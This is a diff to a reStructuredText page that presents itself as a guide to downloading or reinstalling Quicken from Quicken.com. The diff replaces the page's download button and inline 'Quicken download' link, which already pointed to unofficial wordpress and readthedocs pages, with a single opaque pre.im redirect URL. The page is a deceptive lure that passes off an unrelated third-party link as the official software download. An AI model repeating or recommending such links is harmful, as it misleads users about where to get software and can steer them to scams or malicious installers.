@@ -4,7 +4,7 @@ How Do I Download Quicken from Quicken.com to Install or Reinstall It?
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://quickencomdownload.wordpress.com/" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href="https://pre.im/?GZGqGXnYcaJ3T7bVXiYyfBqGqKFA1k8LwyGSLMw970xuuEFf77t4nYTrCPVwb1koyZWWLgUzUi" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
             Download Quicken Now
         </a>
     </div>
@@ -14,7 +14,7 @@ Whether you're setting up Quicken for the first time, switching to a new device,
 Why You Might Need to Reinstall or Download Quicken Again
 ----------------------------------------------------------
 
-There are several reasons why you might need a fresh  `Quicken download <https://contactquickenhelpline.readthedocs.io/en/latest/>`_ :
+There are several reasons why you might need a fresh  `Quicken download <https://pre.im/?GZGqGXnYcaJ3T7bVXiYyfBqGqKFA1k8LwyGSLMw970xuuEFf77t4nYTrCPVwb1koyZWWLgUzUi>`_ :
 
 - You’ve purchased a new laptop or desktop and want to transfer Quicken.
 - Your previous device was reset, formatted, or corrupted.
